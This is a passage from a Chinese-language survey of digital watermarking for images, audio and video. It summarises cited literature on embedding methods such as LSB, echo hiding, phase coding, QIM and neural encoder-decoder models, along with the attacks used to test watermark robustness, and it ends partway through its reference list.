嵌入水印的估计值，然后从水印图像中将这个估计值减去$^{\mathrm{[19]}}$。它的一种变形是同一个水印重复嵌入一个数据的几个位置，再将这几个位置看作独立的而实施上述合谋攻击，从而估计出嵌入的水印$^{\mathrm{[20]}}$。一个攻击者拥有大约10个不同的拷贝就能成功地将水印除去$^{\mathrm{[21]}}$。</p><p>（2）敏感性攻击</p><p>水印敏感性分析攻击的基本思想$^{\mathrm{[22]}}$是：使用相关水印检测器寻找从水印检测区域到区域边缘的捷径，而该捷径可由检测区域表面的法线近似表示，并且该法线在检测区域的绝大部分是相对恒定的。</p><p>水印敏感性分析攻击的成功，依赖于检测区域边界的法线可用于寻找越出检测区域的捷径。如果检测区域边界的曲率使在每一点的法线仅提供关于该捷径方向的极少信息，则敏感性分析攻击在计算上是不可行的。因此构造具有这种性质的水印检测区域是一个需要关注的问题。</p><h3 id="6-4-2-表达攻击"><a href="#6-4-2-表达攻击" class="headerlink" title="6.4.2 表达攻击"></a>6.4.2 表达攻击</h3><p>表达攻击是让图像水印变形而使水印存在性检测失败。与健壮性攻击相反，表达攻击实际上并不除去嵌入的水印，而试图使水印检测器与其纳入的信息不同步。</p><p>（1）置乱攻击</p><p>置乱攻击$^{\mathrm{[17]}}$是指在将水印图像提交水印检测器之前，先对图像的像素值进行置乱，通过水印检测器之后再进行逆置乱。这种置乱可以是像素值简单的行（或列）的置换，也可以是比较复杂的随机置乱。置乱程度与使用的检测策略有关。最著名的置乱攻击是马赛克攻击$^{\mathrm{[23]}}$，它将嵌入了水印的图像分割成许多检测不到水印的小方块，这些小方块再Web页上按相应的HTML标记重新组装起来，但由于这些块太小而无法容纳水印数据，所以无法发现水印。</p><p>（2）同步攻击</p><p>许多水印技术对同步性非常敏感，要求在检测水印之前，嵌入了水印的图像必须正确对齐。攻击者可在保真度的约束下，通过对图像的几何变形来干扰这种同步性，使得水印虽然存在但却检测不出来。引起失同步的这些几何变形可以是简单的平移、旋转、缩放，或较复杂的图像剪切、水平翻转、行（或列）删除，以及随机几何变形（如直方图拉伸、均衡、非线性扭曲等），甚至是某些几何变形的组合。</p><h3 id="6-4-3-解释攻击"><a href="#6-4-3-解释攻击" class="headerlink" title="6.4.3 解释攻击"></a>6.4.3 解释攻击</h3><p>在一些水印方案中可能存在对检测出的水印具有多种解释。解释攻击包括拷贝攻击、可逆攻击等，它使数字水印的版权保护受到了挑战。</p><p>（1）拷贝攻击</p><p>拷贝攻击$^{\mathrm{[24]}}$是从嵌入水印的图像中估计出水印并拷贝到目标图像的其他图像中。拷贝的水印要自适应于目标图像，以保证其不可察觉性。使用拷贝攻击在目标图像中生成一个有效的水印，这既不需要算法知识又不需要水印密钥知识。拷贝攻击分为3步进行：</p><ol><li>找出图像中水印的估计值；</li><li>处理该估计值，使得水印能量最大化并满足不可感知性要求；</li><li>将处理后的水印估计值嵌入目标图像得到伪造的水印图像。</li></ol><p>（2）可逆攻击</p><p>可逆攻击$^{\mathrm{[25]}}$基于大多数水印方案的嵌入算法是可逆的和多数水印嵌入是健壮的这一事实，攻击者将水印嵌入过程逆过来使用即可。可逆攻击对盲水印系统同样适用，可通过建立一个类似噪声但与发布的图像具有很高相关性的伪造水印实施攻击，这样的水印可通过提取和改变发布图像的某些特征来构造。攻击者从发布的图像中减去伪造的水印便可建立一个伪造的原图像，从而使水印检测陷入死锁，造成图像所有权的模糊性。</p><p>从以上分析可以看出，健壮性攻击将对水印造成实质性的损害，遭受这类攻击的水印是难以检测或恢复的；表达攻击是水印方案面临的公开问题，目前仍然缺乏有效的对抗策略，只能通过预见可能遇到的具体攻击方法进行预防，由于它不影响水印的存在性，使用更先进的检测器可能检测到攻击过的水印；解释攻击破坏了水印应用的基础，攻击的是水印必须具有的唯一性解释，但在采取相应的措施后这种攻击是难以实施的。</p><hr><h1 id="7-针对音频的数字水印生成和攻击"><a href="#7-针对音频的数字水印生成和攻击" class="headerlink" title="7 针对音频的数字水印生成和攻击"></a>7 针对音频的数字水印生成和攻击</h1><p>近年来，数字多媒体技术及互联网技术的迅猛发展使得图像、视频和音频等多种形式的多媒体数字作品的创作、存储和传输都变得极其便利。以MP3为代表的网络音乐在互联网上广泛传播就是得益于数字音频压缩技术的成熟。但是，Internet上肆无忌惮的复制和传播盗版音乐制品，使得艺术作品的作者和发行者的利益受到极大损害。在这种背景下，能够有效地实行版权保护的数字水印技术应运而生。数字音频水印系统的框架如图7.1所示。</p><p><img src="/2024/10/04/%E9%9A%90%E5%BC%8F%EF%BC%88%E4%B8%8D%E5%8F%AF%E8%A7%81%EF%BC%89%E6%95%B0%E5%AD%97%E6%B0%B4%E5%8D%B0%E7%94%9F%E6%88%90%E5%92%8C%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF%E7%BB%BC%E8%BF%B0/image_8_OXLjvHUA8C.png"></p><center>图7.1  数字音频水印系统</center><p>数字音频水印技术就是在不影响原始音频质量的条件下向其中嵌入具有特定意义且易于提取的信息的过程。根据应用目的不同，被嵌入的信息可以是版权标识符、作品序列号、文字（如艺术家和歌曲的名字），甚至是一小段音频等。水印与原始音频数据紧密结合并隐藏在其中，通常是不可听到的，而且能够抵抗一般音频信号处理和盗版者的某些恶意攻击。</p><h2 id="7-1-传统音频数字水印生成方法"><a href="#7-1-传统音频数字水印生成方法" class="headerlink" title="7.1 传统音频数字水印生成方法"></a>7.1 传统音频数字水印生成方法</h2><p>传统音频水印方法的特点是水印嵌入设计极度依赖经验规则与专家知识。然而，对于各类音频想同时满足高不可感知性、高容量、高鲁棒性是极为困难的任务。因此目前开源可用的音频水印工具屈指可数。</p><h3 id="7-1-1-最低有效位替代法"><a href="#7-1-1-最低有效位替代法" class="headerlink" title="7.1.1 最低有效位替代法"></a>7.1.1 最低有效位替代法</h3><p>最低比特位替代法（Least Significant Bits，LSB）是音频信息隐藏中应用最广泛，实现最简单的算法之一。时域上的LSB是把每个采样点的最低比特，也可能是最低几位，用秘密信息的数据比特来替代，提取时只要把相应的最低位取出来，就可以恢复嵌入的秘密信息数据流$^{\mathrm{[26]}}$。</p><p>LSB方法的优点是水印嵌入和提取算法简单，速度快，能够满足实时性的要求；音频信号里可编码的数据量大。但是缺点也是显而易见的，嵌入后的音频信号易于被篡改，隐藏信息容易被信道噪声、重采样、A&#x2F;D、D&#x2F;A等变换破坏，所以鲁棒性差；另外，隐藏数据量大带来的问题是人耳可能会察觉这些隐藏信息产生的噪声，尤其在这种噪声的加载是均匀的时候$^{\mathrm{[27]}}$。</p><p>一些学者进行深入研究，也提出了许多改进方案。如为了提高传统LSB方法的健壮性，Nedeljko等人提出将秘密信息嵌入载体信息LSB的高位（第4位以上），同时修改载体信息的低位，以减少因嵌入带来的嵌入误差$^{\mathrm{[28]}}$。Nedeljko的LSB方法比传统的LSB方法在健壮性方面有了较大的提高，但是这种提高是建立在降低感知透明性（不可感知性）的基础上的$^{\mathrm{[29]}}$。为了改善这一点可以在嵌入过程中根据音频的能量进行数据嵌入位的自适应选择$^{\mathrm{[30]}}$，当然，这种方法对平均能量比较高的音频样本更有效。</p><h3 id="7-1-2-回声隐藏方法"><a href="#7-1-2-回声隐藏方法" class="headerlink" title="7.1.2 回声隐藏方法"></a>7.1.2 回声隐藏方法</h3><p>回声（Echo）算法最初由Gruhl等人于1996年提出，是通过在时间域向音频信号<em>s</em>(<em>t</em>)引入回声<em>αs</em>(<em>t</em>－△<em>t</em>)来将秘密数据嵌入到音频载体数据中：α为衰减率，△<em>t</em>为延迟时间，其选取以人耳无法分辨为准则。通过改变回声信号的延迟时间来对水印信号进行编码，即可选两个不同的延迟时间来分别代表“0”和“1”。根据人耳的听觉心理模型可知，时延的长短是有限制的，一般的取值范围为0.5～2ms之间。太小会影响嵌入信息的提取，太大就会产生感觉得到的回声。同时，回声的幅度系数α也需要精心挑选，它与时延的取值及传输环境有关，一般的范围是0.6～0.9之间，太小会影响嵌入信息提取的准确性，太大会破坏不可感知性。回声算法的提取比嵌入要复杂些，其关键的是回声时延的测定。由于嵌有秘密信息的信号是载体信号与回声信号的卷积，所以可以利用语音信号处理中的同态处理技术，用倒谱自相关测定回声间距。在进行提取前必须知道数据的起点、帧的长度、回声核的时延长度等参数$^{\mathrm{[26]}}$。</p><p>回声隐藏方法是利用人类听觉系统中的后屏蔽效应，载体数据和经过回声隐藏的隐秘数据对于人耳来说，前者就像是从耳机里听到的声音，没有回声。而后者就像是从扬声器里听到的声音，由所处空间如墙壁、家具等物体产生的回声。因此，回声隐藏与其他方法不同，它不是将密码数据当作随机噪声嵌入到载体数据中，而是作为载体数据的环境条件，因此对一些有损压缩的算法具有一定的鲁棒性$^{\mathrm{[26]}}$。</p><h3 id="7-1-3-相位编码方法"><a href="#7-1-3-相位编码方法" class="headerlink" title="7.1.3 相位编码方法"></a>7.1.3 相位编码方法</h3><p>Bender W等人于1996年提出的音频相位编码（Phase Coding）方法，充分利用人耳对绝对相位不敏感性及对相对相位敏感的特性。Bender W等人提出的相位编码的步骤大致是：首先对宿主音频信号进行分段；再对每段进行DFT变换，得到该段的幅值和相位；保存相邻段之间的相位差△φ；将隐藏的二进制比特序列进行相角变换：0→φ0 &#x3D;π&#x2F;2，1→φ1 &#x3D; －π&#x2F;2，并代替原宿主信号第一段的相位值；根据第一段和前述保存的相邻段之间的相位差△φ决定之后各段的相位值；利用各段隐藏信息后的相位值和未改变的幅值进行傅里叶反变换（IDFT）；将反变换后的各段合并。水印提取时则须知嵌入隐藏信息时的分段长度、DFT变换点数和数据间隔。这种做法的结果使相邻频率分量的相对相位关系与原始音频信号的相对相位关系有较大的差别，从而带来音频变形$^{\mathrm{[27]}}$。</p><p>Ciloglu T将音频信号通过无限脉冲响应（IIR）的全通滤波器，从而将水印信息嵌入到原始音频信号的相位上，无限脉冲响应的全通滤波器通常具有较复杂的相位特性，所以使用这种方法嵌入的水印一般具有较差的不可感知性$^{\mathrm{[31]}}$。</p><h3 id="7-1-4-量化索引调制"><a href="#7-1-4-量化索引调制" class="headerlink" title="7.1.4 量化索引调制"></a>7.1.4 量化索引调制</h3><p>量化索引调制（Quantization Index Modulation，QIM）的大致思想是：将隐藏信号的可能值看成是量化索引，如二进制隐藏信号0、1对应的量化索引值为1、2，其他依次类推。每一个索引值对应不同的量化器，对宿主信号进行量化。具体隐藏及提取的方法大致为：首先将宿主音频信号进行分段，每一段欲隐藏一个值的隐藏信号。用欲隐藏的这个隐藏值对应索引的量化器量化宿主信号，即得隐藏信息控制后的该段信号。依次对每段宿主信号做相应量化即可实现信息隐藏。采用QIM音频隐藏方法可实现盲提取。提取方应知道分段方法，首先按隐藏方同样的方法分段，然后对该段欲提取信号，按各种可能的索引对应的量化器进行量化；比较各种量化结果与实际欲提取信号的差异，取最小的一种索引值，其对应的隐藏值即判为该段嵌入的隐藏信号值。对各段依次进行提取，即得所有隐藏信号的序列$^{\mathrm{[27]}}$。</p><p>对基于量化调制的数字音频水印嵌入方案来说，量化步长的选取至关重要。因为量化步长与水印嵌入强度密切相关，量化步长取值越大，数字水印鲁棒性能越好（但同时也更容易给音频引入失真）。选取确定量化步长应充分考虑数字音频自身特点和人类视觉掩蔽特性。现有量化调制音频水印嵌入方案普遍采用了均匀量化策略，即对整个数字音频采用一个相同的量化步长*,*而且量化步长必须结合大量实验得到。不同的载体音频信号，只有采纳不同的量化步长值才能各自达到比较好的隐藏效果$^{\mathrm{[32]}}$。文献[32]引入模糊聚类分析理论，提出了一种自适应量化小波域数字音频盲水印算法。该算法能够结合数字音频局部特征，利用模糊聚类分析自适应确定量化步长，并在小波域内将水印信号嵌入到音频数据段的低频分量中。</p><h2 id="7-2-深度学习音频水印生成方法"><a href="#7-2-深度学习音频水印生成方法" class="headerlink" title="7.2 深度学习音频水印生成方法"></a>7.2 深度学习音频水印生成方法</h2><p>神经网络音频水印方法的特点在于能够自动学习水印嵌入、提取方式，极大降低了水印方法的设计难度。如图7.2所示，基于神经网络的水印模型遵循Encoder-Decoder结构，音频与要嵌入的比特信息一块输入到Encoder，由Encoder产生水印音频，随后Decoder利用水印音频解码信息内容，整个模型以端到端的方式进行训练，自动学习水印嵌入与提取。</p><p><img src="/2024/10/04/%E9%9A%90%E5%BC%8F%EF%BC%88%E4%B8%8D%E5%8F%AF%E8%A7%81%EF%BC%89%E6%95%B0%E5%AD%97%E6%B0%B4%E5%8D%B0%E7%94%9F%E6%88%90%E5%92%8C%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF%E7%BB%BC%E8%BF%B0/image_9_vVXnzKAeg0.png"></p><center>图7.2  神经网络音频水印模型架构图</center><p>为使得音频水印具备鲁棒性，可以在Encoder之后进一步添加一个“攻击模拟层”（Attack Layer），对水印音频施加攻击处理（比如MP3压缩、高斯噪声），从而使得模型学习出对特定攻击鲁棒的嵌入方式。</p><p>这种Encoder-Attack Layer-Decoder的结构由Jiren等人$^{\mathrm{[33]}}$于2018年提出，流行于图像水印领域。目前音频水印领域还处在起步阶段，主要有三篇代表性的文章：Robust-DNN$^{\mathrm{[34]}}$、DeAR$^{\mathrm{[35]}}$和WavMark$^{\mathrm{[36]}}$。这些论文的意义是递进的：Robust-DNN、完成了神经网络音频水印的可行性验证；DeAR提高了嵌入容量并、扩充了攻击类型；而WavMark进一步提高了不可感知性、并解决了水印解码时的定位问题，使得神经网络音频水印能够被真正应用于现实环境。</p><h3 id="7-2-1-Robust-DNN"><a href="#7-2-1-Robust-DNN" class="headerlink" title="7.2.1 Robust-DNN"></a>7.2.1 Robust-DNN</h3><p>最早的基于神经网络的音频水印是2022年的Roubst-DNN$^{\mathrm{[34]}}$。这篇文章遵循Encoder-Attack Layer-Decoder的基本结构，在STFT频域执行嵌入、实现对三种攻击类型的鲁棒性（Dropout、随机噪声、高通滤波），达到了较低的嵌入容量（1.25bps）在Encoder选取上，模型使用了基于U-Net的结构。</p><p><img src="/2024/10/04/%E9%9A%90%E5%BC%8F%EF%BC%88%E4%B8%8D%E5%8F%AF%E8%A7%81%EF%BC%89%E6%95%B0%E5%AD%97%E6%B0%B4%E5%8D%B0%E7%94%9F%E6%88%90%E5%92%8C%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF%E7%BB%BC%E8%BF%B0/image_10_Y-Dosq0vx5.png"></p><center>图7.3  Robust-DNN模型架构图</center><p>输入长度为2秒、16kHz采样率的宿主音频，通过短时傅里叶变换（STFT）转变为特征图。特征图经过U-Net下采样后与512维的比特信息向量进行相加操作（element-wise），随后执行上采样得到水印音频表示。</p><h3 id="7-2-2-DeAR"><a href="#7-2-2-DeAR" class="headerlink" title="7.2.2 DeAR"></a>7.2.2 DeAR</h3><p>DeAR$^{\mathrm{[35]}}$同样是在频域执行嵌入，相较Robust-DNN将抵抗的攻击类型扩充到9种，并实现了更高的嵌入容量（9bps）。此外，它在结构上的特点是Encoder所产生的内容不是水印音频，而是残差（Residual），将残差乘以系数与宿主音频相加后得到水印音频。</p><p><img src="/2024/10/04/%E9%9A%90%E5%BC%8F%EF%BC%88%E4%B8%8D%E5%8F%AF%E8%A7%81%EF%BC%89%E6%95%B0%E5%AD%97%E6%B0%B4%E5%8D%B0%E7%94%9F%E6%88%90%E5%92%8C%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF%E7%BB%BC%E8%BF%B0/image_11_NdL4EQcUXu.png"></p><center>图7.4  DeAR模型架构图</center><p>直观来看，这种结构的优点是在使用时可以通过调整系数来控制加水印力度，从而在鲁棒性与不可感知性之间进行折中。但是仔细想想就会发现，这种优点并非此类学习残差的结构所独有，因为“水印音频 - 原始音频 &#x3D; 残差”。所以对于Robust-DNN这类直接生成水印音频的模型，可以先得到水印音频，然后减去原始音频得到残差，进而实现定量调整。</p><p>在具体的嵌入设计上，DeAR使用了离散小波变换（Discrete Wavelet Transform, DWT），依靠1D-CNN修改低频小波系数实现嵌入。宿主音频长度为11秒，44.1kHz采样率；嵌入bit信息为100维度，因此嵌入容量为8.8bps。此外，DeAR将“音频转录”视为三种基本攻击的叠加（高斯噪声、带通滤波、环境混响），通过引入相应的攻击模拟层，从而实现了对转录攻击的鲁棒性。</p><h3 id="7-2-3-WavMark-x20"><a href="#7-2-3-WavMark-x20" class="headerlink" title="7.2.3 WavMark&#x20;"></a>7.2.3 WavMark&#x20;</h3><p>之前两种基于神经网络的水印模型虽然实现了音频的嵌入与提取，但是离实际应用还存在一些距离，因为1）水印音频质量不高，人耳可以听得到噪声；2）实验环境过于理想，没有考虑水印在解码时的“定位问题”；3）嵌入容量有待进一步提升（&lt; 10bps)。微软亚洲研究院提出了WavMark$^{\mathrm{[36]}}$，使得神经网络音频水印被真正地应用于现实环境。</p><p>整体而言，WavMark实现了32bps的嵌入容量、对10种常见攻击类型的鲁棒性，并保持了良好的不可感知性（SNR &gt; 36dB，PESQ &gt; 4.0）。</p><p><img src="/2024/10/04/%E9%9A%90%E5%BC%8F%EF%BC%88%E4%B8%8D%E5%8F%AF%E8%A7%81%EF%BC%89%E6%95%B0%E5%AD%97%E6%B0%B4%E5%8D%B0%E7%94%9F%E6%88%90%E5%92%8C%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF%E7%BB%BC%E8%BF%B0/image_12_wA_p-kLHHF.png"></p><center>图7.5  WavMark模型架构图</center><p>WavMark提高水印音频质量与嵌入容量的关键点在于它使用了基于“可逆神经网络”（Invertible Neural Network）的Encoder与Decoder。“可逆神经网络”最早提出于2014年（Nice：Non-linear independent components estimation，2014），其特点是网络运算是完全可逆的。如果将普通神经网络的运算过程记为$y&#x3D; f(x)$，则可逆网络同时支持将结果“逆向输入”，由 $y$ 得到 $x:x &#x3D; f^{\mathrm{−1}}(y)$。这种可逆的特点使得可逆网络在水印嵌入、解码任务上能获得更好的表现。为解释这一点，可以重新审视音频水印模型的基本结构——宿主音频与水印信息经过Encoder后得到水印音频，随后Decoder进行消息解码。</p><h2 id="7-3-音频数字水印常见攻击"><a href="#7-3-音频数字水印常见攻击" class="headerlink" title="7.3 音频数字水印常见攻击"></a>7.3 音频数字水印常见攻击</h2><p>对数字音频水印技术进行的攻击通常有滤波、重采样、重量化、剪切、加噪声、时间缩放、变调、混频和有损压缩等，此外还有针对某种水印技术专门设计的攻击以及协议层的解释攻击$^{\mathrm{[37]}}$，而且已经出现了顽健性标准测试工具Stirmark for Audio$^{\mathrm{[38]}}$。</p><p>根据对音频信号同步结构的影响一般把攻击分为两类：</p><p><strong>类型一</strong>：MPEG压缩、低通&#x2F;带通滤波、加性&#x2F;乘性噪声、加入回声和重采样&#x2F;重量化。这种类型的攻击不显著影响音频信号的同步结构。</p><p><strong>类型二</strong>：抖动攻击（jittering）、时间尺度变形（time-scale warping）、变调（pitch-shift warping）以及上下采样（up&#x2F;down sampling）。这种类型的攻击会损坏音频信号的同步结构，比第一种类型的攻击更具挑战性。</p><p>同步问题对任何数据隐藏技术都是一个严重的问题，尤其是对一维的音频信号。剪切掉不想要的音频片段或随机向音频数据中添加和删除样本，都会引起这个问题。扩频技术中采用的相关检测器依赖于待检测信号和水印信号之间精确的对齐，同步错误会对检测性能产生严重的影响$^{\mathrm{[39]}}$。大多数的音频水印算法都是基于位置的，即水印嵌入到特定位置再从该位置检测，而同步攻击引起的位移将会使水印检测不在嵌入位置上进行，这就需要在检测前恢复同步。</p><hr><h1 id="8-针对视频的数字水印生成和攻击"><a href="#8-针对视频的数字水印生成和攻击" class="headerlink" title="8 针对视频的数字水印生成和攻击"></a>8 针对视频的数字水印生成和攻击</h1><p>随着互联网和视频编码技术的飞速发展，尤其是一些新的视频编码标准如H.264&#x2F;AVC的普及，视频应用早已成为大众生活中的一部分，但技术的不断更新换代也带来了一些严重的问题。如今，高带宽的网络服务使数字媒体内容的分发、复制、编辑变得愈发容易，同时也使得盗版行为越来越猖獗。屡禁不止的盗版行为严重损害了影视行业、视频所有者的利益，对视频等数字多媒体数据的版权保护迫在眉睫。</p><p>视频数字水印作为一种可以起到版权保护作用的技术，已经被大范围应用。与传统的数字图像水印技术类似，视频水印技术也是将特定的信息如视频所有者的logo嵌入视频，从而起到保护视频所有权的目的。</p><h2 id="8-1-基于非压缩域的视频水印方案"><a href="#8-1-基于非压缩域的视频水印方案" class="headerlink" title="8.1 基于非压缩域的视频水印方案"></a>8.1 基于非压缩域的视频水印方案</h2><p>非压缩域的视频水印方案处理的对象是原始的、未经压缩的视频数据。这类方案一般需要先对压缩后的视频进行解码，然后嵌入水印，最后进行重压缩，所以计算量较大。由于原始的视频数据就是由一系列的图像组成的，早期一些学者提出可以直接将静态图像的数字水印方案应用在视频中。与图像水印的处理思路类似，对于视频信号，可以直接在空间域（像素域）对原始视频数据进行处理，如可以直接对每帧图像的像素值进行操作，也可以将原始视频数据变换到变换域，再进行水印嵌入。常见的变换操作有DCT变换、DWT变换和DHT变换等。其中，对DCT域的水印方案讨论最为广泛。</p><h3 id="8-1-1-空间域水印方案"><a href="#8-1-1-空间域水印方案" class="headerlink" title="8.1.1 空间域水印方案"></a>8.1.1 空间域水印方案</h3><p>早期的一些方案$^{\mathrm{[40-43]}}$都借鉴了扩频通信的思想。Hartung$^{\mathrm{[41]}}$针对MPEG-2视频数据，提出了面向非压缩视频和压缩视频的两套数字水印方案。扩频通信的目的是通过一个宽带信号来传输窄带信号，可以利用这种思想让视频数据携带水印信号。通常来说，一个视频信号被看成是三维的，而文中将原始视频信号扫描成一个一维信号，扫描方式为从左到右，从上到下，从前到后。先将要嵌入的水印比特序列乘以一个因子来获得扩展序列。然后，将扩展的序列乘以一个局部可调振幅因子，并用一个二进制伪噪声信号对信号序列进行调制，最终完成扩频。在此基础上将扩频的水印信号叠加到一维视频信号上。由于经过以上处理的水印信号和伪噪声信号相似，所以水印信息很难被检测、定位以及篡改。</p><h3 id="8-1-2-频率域水印方案"><a href="#8-1-2-频率域水印方案" class="headerlink" title="8.1.2 频率域水印方案"></a>8.1.2 频率域水印方案</h3><p>Cox$^{\mathrm{[18]}}$提出将水印构造为独立的且分布均匀的高斯随机矢量，以不易察觉的方式将它们以类似于扩展频谱的方式插入到数据中视觉感知最为明显的频谱分量中。在这种情况下插入水印会使水印对信号处理操作（如有损压缩、滤波、模数转换、重新量化等）以及常见的几何变换（如裁剪、缩放、平移和旋转）具有较好的鲁棒性。</p><p>Zhu$^{\mathrm{[44]}}$将具有高斯分布特征的水印嵌入所有的高通小波系数，这样可以允许不同解析度下的小波域水印信息的检测。</p><h2 id="8-2-基于压缩域的视频水印方案"><a href="#8-2-基于压缩域的视频水印方案" class="headerlink" title="8.2 基于压缩域的视频水印方案"></a>8.2 基于压缩域的视频水印方案</h2><p>由于在实际应用中，视频数据基本上都是以压缩的形式进行存储和传输的，所以在此背景下，如果还是针对原始的视频信号进行水印嵌入，则首先需要进行压缩视频码流的解码，然后嵌入水印，最后重新进行压缩编码，所以计算量很大。因此，应用基于压缩视频的数字水印方案是很有必要的。由于嵌入水印信息的压缩视频将来会被解码，所以这一类方案的基本要求是在解码后，水印信息仍然存在于视频中，并且可以被正确提取出来。</p><p>基于压缩视频的数字水印方案根据处理阶段的不同可以分为两类：第一类是在压缩视频的过程中嵌入数字水印；第二类是直接在压缩后的视频码流中嵌入数字水印（或者只进行部分解码来嵌入水印）。</p><h3 id="8-2-1-编码过程中的水印方案"><a href="#8-2-1-编码过程中的水印方案" class="headerlink" title="8.2.1 编码过程中的水印方案"></a>8.2.1 编码过程中的水印方案</h3><p>这类方案是在视频的编码过程中进行水印嵌入操作，从已有的方案来看，主要还是把水印嵌入DCT系数或者运动矢量中。在视频的编码过程中视频序列中只有少部分帧（如I帧）使用的是帧内预测，而大部分帧（如B帧和P帧）使用的是帧间预测。由于在帧间预测的编码过程中需要使用运动估计来预测当前帧，此过程中会产生大量的运动矢量，因此将水印信息嵌入运动矢量中也是一类讨论较为广泛的方案。</p><p>Song$^{\mathrm{[45]}}$针对AVS编码的视频，提出可以通过修改不同宏块的运动矢量分辨率来实现水印的嵌入，修改规则是基于运动矢量分辨率和水印之间的映射规则。</p><p>Qiu$^{\mathrm{[46]}}$等在H.264&#x2F;AVC编码过程中将鲁棒水印和脆弱水印一起嵌入视频，通过更改一组选定的运动矢量的分量，将脆弱水印嵌入运动矢量，通过改变I帧中量化的AC系数将鲁棒水印嵌入DCT域。该方案可以同时满足版权保护和篡改认证的需求。</p><p>Zhang$^{\mathrm{[47]}}$提出首先对水印信息进行预处理，并对灰度水印模式进行处理，然后将其嵌入运动矢量。</p><h3 id="8-2-2-基于压缩视频码流的水印方案"><a href="#8-2-2-基于压缩视频码流的水印方案" class="headerlink" title="8.2.2 基于压缩视频码流的水印方案"></a>8.2.2 基于压缩视频码流的水印方案</h3><p>Hartung$^{\mathrm{[41]}}$同样使用上文提到的扩频通信的方法来产生和伪噪声信号类似的伪随机水印信号，然后将水印信号排列成和视频帧具有相同维度的信号，接着对该水印信号进行8×8的DCT变换，然后将变换后的信号和码流中8×8的DCT系数相加完成嵌入。此方案面临的主要问题是：加入水印可能会导致霍夫曼码的增长，从而引起码流长度增加；在视频编码过程中，如果参考帧发生变化，则其可能会在时间上和空间上传播开来，而加入水印即会造成帧的变化，引起差错传播。因此，作者提出需要额外添加一个偏移补偿信号来补偿前一帧的水印信号来避免此问题。</p><h2 id="8-3-视频数字水印常见攻击"><a href="#8-3-视频数字水印常见攻击" class="headerlink" title="8.3 视频数字水印常见攻击"></a>8.3 视频数字水印常见攻击</h2><p>按照对水印化视频流的操作目的不同，对水印的攻击可以分为无意的攻击和有意的攻击。</p><h3 id="无意的攻击"><a href="#无意的攻击" class="headerlink" title="无意的攻击"></a>无意的攻击</h3><p>无意攻击采用各种压缩编码标准（如MPEG-1、MPEG-2和MPEG-4等）对视频进行压缩编码；在NTSC、PAL、SECAM和通常的电影标准格式之间转换时所带来的帧速率和显示分辨率的改变，以及屏幕高宽比的改变（如4∶3，16∶9，2.11∶1）；帧删除、帧插入、帧重组等视频编辑处理；数&#x2F;模和模&#x2F;数转换，在转换中给视频可能带来的影响包括低通滤波、添加噪声、对比度轻微改变以及轻微的几何失真等。</p><h3 id="8-3-2-有意的攻击"><a href="#8-3-2-有意的攻击" class="headerlink" title="8.3.2 有意的攻击"></a>8.3.2 有意的攻击</h3><p>Hartung等$^{\mathrm{[48]}}$将水印攻击分为4类：简单攻击、检测失效攻击、混淆攻击和移去水印攻击。Voloshynovskiy等$^{\mathrm{[49]}}$提出的分类方法，也把水印攻击分为4类：移去水印的攻击、几何攻击、密码攻击和协议攻击。对于单个视频帧，针对静态图像的攻击一般来说仍然有效；对于连续视频帧，除了帧删除、帧插入、帧重组等攻击之外，还有统计平均攻击和统计共谋攻击两种攻击方法。平均攻击是对局部连续的帧求平均，以消除水印平均攻击方法对于在各帧中嵌入随机的、统计独立的水印算法比较有效。统计共谋攻击方法是先从单个的帧中估计出水印，并在不同的场景中求平均以取得较好的精确度；然后从每帧中减去估计的水印。这种攻击对于在所有帧中嵌入相同的水印的方案比较有效。</p><hr><h1 id="9-展望与未来的挑战"><a href="#9-展望与未来的挑战" class="headerlink" title="9 展望与未来的挑战"></a>9 展望与未来的挑战</h1><p>随着AIGC时代的发展，数字媒体安全领域对于可证安全的需求日益突出。未来的发展趋势之一是在可证安全隐写技术的基础上研究和设计可证性能无损水印技术，即在保持图像质量不受影响的情况下，实现水印的可靠提取和验证，为数字内容的真实性和完整性提供更强的保障。考虑到水印技术的不断进步，嵌入方式逐渐朝向更为隐蔽和智能化的方向发展。</p><p>此外，传统数字水印和深度学习水印技术结合的多重水印技术可能能够克服传统水印算法在面对复杂攻击时的局限性。融合传统水印的泛化性和深度水印的针对性，可以满足不同应用场景下的需求。这种技术的发展可能是数字媒体安全领域未来的一个重要方向，为数字内容的保护提供更为可靠和多元化的解决方案。</p><p>随着视频水印技术的发展，新的攻击算法也在不断地提出，对水印的鲁棒性构成了很大的挑战。有关水印算法的复杂度、水印的鲁棒性和不可感知性、水印的随机检测等关键技术和问题亟待研究和解决。</p><hr><h1 id="10-参考文献"><a href="#10-参考文献" class="headerlink" title="10 参考文献"></a>10 参考文献</h1><ol><li>Pevný T, Filler T, Bas P. Using high-dimensional image models to perform highly undetectable steganography. International Workshop on Information Hiding. Springer, Berlin, Heidelberg, 2010: 161-177.</li><li>Holub V, Fridrich J. Designing steganographic distortion using directional filters. 2012 IEEE International workshop on information forensics and security (WIFS). IEEE, 2012: 234-239.</li><li>Holub V, Fridrich J. Digital image steganography using universal distortion. Proceedings of the first ACM workshop on Information hiding and multimedia security. 2013: 59-68.</li><li>Jindal N, Liu B. Review spam detection. Proceedings of the 16th international conference on World Wide Web. 2007: 1189-1190.</li><li>Fridrich J, Kodovsky J. Rich models for steganalysis of digital images. IEEE Transactions on Information Forensics and Security, 2012, 7(3): 868-882.</li><li>Holub V, Fridrich J. Low-complexity features for JPEG steganalysis using undecimated DCT. IEEE Transactions on Information Forensics and Security, 2014, 10(2): 219-228.</li><li>Xu G, Wu H Z, Shi Y Q. Structural design of convolutional neural networks for steganalysis. IEEE Signal Processing Letters, 2016, 23(5): 708-712.</li><li>Ye J, Ni J, Yi Y. Deep learning hierarchical representations for image steganalysis. IEEE Transactions on Information Forensics and Security, 2017, 12(11): 2545-2557.</li><li>Boroumand M, Chen M, Fridrich J. Deep residual network for steganalysis of digital images[J]. IEEE Transactions on Information Forensics and Security, 2018, 14(5): 1181-1193.</li><li>Zhu J, Kaplan R, Johnson J, et al. Hidden: Hiding data with deep networks[C]&#x2F;&#x2F; Proceedings of the European conference on computer vision (ECCV). 2018: 657-672.</li><li>Han Fang, Yupeng Qiu, Kejiang Chen, Jiyi Zhang, Weiming Zhang, and Ee-Chien Chang. 2023. Flow-based robust watermarking with invertible noise layer for black-box distortions. In Proceedings of the Thirty-Seventh AAAI Conference on Artificial Intelligence and 